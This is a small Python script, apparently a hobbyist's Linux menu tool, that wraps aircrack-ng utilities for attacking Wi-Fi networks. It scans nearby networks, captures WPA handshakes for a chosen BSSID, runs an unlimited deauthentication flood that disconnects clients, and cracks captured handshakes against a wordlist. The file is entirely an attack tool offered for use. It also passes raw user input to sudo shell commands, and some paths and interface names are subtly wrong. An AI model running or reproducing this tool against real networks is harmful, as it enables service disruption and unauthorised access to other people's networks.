import os
import time
#This is an command runner python code for the linux (this code does not works in the windows or in any other)
#Copyright(C) made by Tanishq49
networkInterface = input("Enter the name of your wifi adapter:")
while True:
    command = input("Enter the command here to execute:") #Taking the name of the command as input
    
    if command == "scanNetworks":
        os.system(f"sudo airodump-ng {networkInterface}")
    elif command == "capHandshake":
        bssid = input("Enter the bssid of the network:")
        channel = input("Enter the channel of the network:")
        fileName = input("Enter the name of the file:")
        if os.path.exists("handshakes"):
            os.system(f"sudo airodump-ng -w {fileName} -c {channel} --bssid {bssid} {networkInterface}")
        else:
            os.mkdir("handshakes")
            print("Made the handshakes directory")
            os.system(f"sudo airodump-ng -w {fileName} -c {channel} --bssid {bssid} {networkInterface}")
    elif command == "deauth":
        bssid = input("Enter the bssid of the wifi network:")
        print("Running the deauth script..")
        time.sleep(1)
        os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0")
    elif command == "crack":
        handshake_name = input("Enter the path of you handshake file:")
        wordlistPath = input("Enter the path of your wordlist:")
        print("Initializing..")
        time.sleep(1)
        os.system(f"sudo aircrack-ng {"./handshakes"+handshake_name} -w {wordlistPath}")
    elif command == "help":
        print(""" 
Commands:
scanNetworks
capHandshake
deauth
crack             
              """)
    else:
        print("Invalid command try running a valid command or type help in the command area")